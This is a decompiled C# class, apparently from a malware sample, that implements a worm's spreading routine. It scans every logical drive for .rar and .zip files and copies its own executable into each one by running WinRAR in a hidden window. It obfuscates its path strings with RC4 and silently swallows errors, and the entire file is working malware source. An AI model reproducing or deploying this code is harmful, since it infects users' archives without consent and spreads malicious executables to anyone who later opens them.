using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ajhfsdlhjasnagfgewfwsg;

public class Rar
{
	private static string _rarPath;

	private static string _copiedExeName;

	[DebuggerNonUserCode]
	public Rar()
	{
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	private static void Search(string pathName)
	{
		string[] files = Directory.GetFiles(pathName);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				RarStart(text);
			}
			if (text.Contains(".zip"))
			{
				RarStart(text);
			}
		}
		string[] directories = Directory.GetDirectories(pathName);
		string[] array2 = directories;
		foreach (string pathName2 in array2)
		{
			Search(pathName2);
		}
	}

	public static void Spread(string myExeName)
	{
		_copiedExeName = myExeName;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string pathName in array)
		{
			Search(pathName);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RRRRR.RC4("ä}Èr;&ª\u0005¤#³", "Sikan"));
	}

	public static void RarStart(string archiveToInject)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		_rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + RRRRR.RC4("ä^Äq\u0019SÀw‡2©\fùCÔ$Ûp", "Sikan");
		if (File.Exists(_rarPath))
		{
			if (!File.Exists(Path.Combine(path, _copiedExeName)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, _copiedExeName));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, _copiedExeName), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			object obj = new StringBuilder(255);
			GetShortPathName(archiveToInject, (StringBuilder)obj, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = Conversions.ToString(Operators.AddObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" a ", obj), (object)" "), (object)text));
				processStartInfo.FileName = _rarPath;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
